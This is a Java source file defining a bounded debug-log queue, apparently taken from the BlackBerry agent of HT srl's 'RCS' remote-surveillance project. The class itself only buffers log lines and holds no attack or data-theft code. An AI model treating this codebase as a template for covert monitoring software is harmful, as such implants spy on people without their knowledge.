//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.debug;

import blackberry.utils.BlockingQueue;
import blackberry.utils.BlockingQueue.ClosedException;

public class DebugQueue {

    private static final int MAX_NUM_MESSAGES = 5000;
    boolean haveMessages;
    int numMessages;

    BlockingQueue queueAll;

    public DebugQueue() {
        queueAll = new BlockingQueue();
    }

    /**
     * Append.
     * 
     * @param message
     *            the message
     * @param highPriority
     * @return true, if successful
     */
    public boolean enqueue(final String message, int level, boolean error) {

        if (numMessages > MAX_NUM_MESSAGES) {
            return false;
        }

        LogLine log = new LogLine(message, level, error);

        try {
            queueAll.enqueue(log);
            numMessages++;
            haveMessages = true;
            return true;
        } catch (ClosedException ex) {
            return false;
        }
    }

    public LogLine dequeue() {

        LogLine logLine = (LogLine) queueAll.dequeue();
        numMessages = Math.max(0, numMessages - 1);
        haveMessages = numMessages > 0;

        return logLine;
    }

    public void close() {
        queueAll.close();
    }
}
